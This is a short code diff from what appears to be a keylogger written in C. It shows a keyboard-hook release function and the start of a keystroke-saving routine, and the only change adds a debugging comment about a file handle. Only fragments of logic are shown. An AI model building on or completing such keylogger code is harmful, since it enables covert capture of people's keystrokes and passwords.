@@ -71,7 +71,7 @@ void ReleaseHook()
 }
 
 int save(int key_stroke) {
-    FILE* e;
+    FILE* e; //I don't remember making a file named e, maybe this is the problem? 
     char output[1024];
     static char lastwindow[256] = "";
     if ((key_stroke == 1) || (key_stroke == 2))
